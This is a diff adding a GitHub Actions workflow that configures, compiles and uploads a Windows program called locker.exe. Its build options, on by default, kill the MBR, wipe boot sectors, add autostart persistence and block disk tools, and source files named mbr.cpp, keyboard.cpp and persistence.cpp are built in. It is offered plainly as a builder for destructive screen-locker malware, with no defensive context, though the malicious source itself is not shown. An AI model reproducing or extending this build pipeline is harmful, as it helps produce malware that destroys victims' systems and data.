@@ -1,0 +1,78 @@
+name: Build C++ Locker
+on:
+  workflow_dispatch:
+    inputs:
+      password:
+        description: 'Unlock password (plain)'
+        required: true
+        default: '8841'
+      autostart:
+        description: 'Autostart? (1/0)'
+        required: true
+        default: '1'
+      kill_mbr:
+        description: 'Kill MBR? (1/0)'
+        required: true
+        default: '1'
+      wipe_boot:
+        description: 'Wipe boot sectors? (1/0)'
+        required: true
+        default: '1'
+      block_usb:
+        description: 'Block disk tools? (1/0)'
+        required: true
+        default: '1'
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python (for hash)
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Generate config.h
+        shell: pwsh
+        env:
+          PASSWORD_IN: ${{ inputs.password }}
+          AUTOSTART_IN: ${{ inputs.autostart }}
+          KILL_MBR_IN: ${{ inputs.kill_mbr }}
+          WIPE_BOOT_IN: ${{ inputs.wipe_boot }}
+          BLOCK_USB_IN: ${{ inputs.block_usb }}
+        run: |
+          $salt = 'QackCppSalt_2026'
+          $env:SALT = $salt
+          $env:PWD_IN = $env:PASSWORD_IN
+          $hash = python -c "import hashlib,os;print(hashlib.sha256(os.environ['SALT'].encode()+os.environ['PWD_IN'].encode()).hexdigest())"
+          $hash = $hash.Trim()
+
+          $cfg = Get-Content src/config.h.in -Raw
+          $cfg = $cfg.Replace('@PASSWORD_HASH@', $hash)
+          $cfg = $cfg.Replace('@SALT@', $salt)
+          $cfg = $cfg.Replace('@AUTOSTART@', $env:AUTOSTART_IN)
+          $cfg = $cfg.Replace('@KILL_MBR@', $env:KILL_MBR_IN)
+          $cfg = $cfg.Replace('@WIPE_BOOT@', $env:WIPE_BOOT_IN)
+          $cfg = $cfg.Replace('@BLOCK_USB@', $env:BLOCK_USB_IN)
+
+          $utf8NoBom = New-Object System.Text.UTF8Encoding $false
+          [System.IO.File]::WriteAllText("$PWD/src/config.h", $cfg, $utf8NoBom)
+
+      - name: Setup MSVC
+        uses: ilammy/msvc-dev-cmd@v1
+
+      - name: Compile
+        shell: cmd
+        run: |
+          cl /std:c++17 /EHsc /O2 /MT /DUNICODE /D_UNICODE ^
+          src\main.cpp src\mbr.cpp src\keyboard.cpp src\persistence.cpp src\recovery.cpp ^
+          /Fe:locker.exe ^
+          /link /SUBSYSTEM:WINDOWS user32.lib gdi32.lib advapi32.lib comctl32.lib bcrypt.lib
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: locker-cpp-exe
+          path: locker.exe
